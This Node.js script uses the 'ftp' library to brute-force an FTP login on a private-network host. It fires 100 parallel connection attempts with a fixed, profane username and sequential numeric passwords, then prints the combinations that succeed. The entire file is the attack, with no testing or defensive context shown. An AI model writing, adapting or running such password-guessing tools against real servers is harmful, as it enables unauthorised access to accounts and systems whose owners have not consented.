const Client = require("ftp");

const cp = option => {
  return new Promise((resolve, reject) => {
    let c = new Client();
    c.connect({
      ...option,
      connTimeout: 10000
    });
    c.on("ready", () => {
      resolve({
        ...option,
        success: true
      });
      c.end();
    });
    c.on("error", e => {
      resolve({
        ...option,
        success: false
      });
      c.end();
    });
  });
};

(async () => {
  try {
      let list=Array(100).fill('naive').map((v, i) =>i+100).map(key=>{
            return cp({
                host:"192.168.61.189",
                user: "fuck",
                password: key,
            })
        })
        let data=await Promise.all(list)
        let success=data.filter(item=>{
            if(item.success){
                return item
            }
        })
        console.log(success);
  } catch (e) {
    console.log(e);
  }
})();
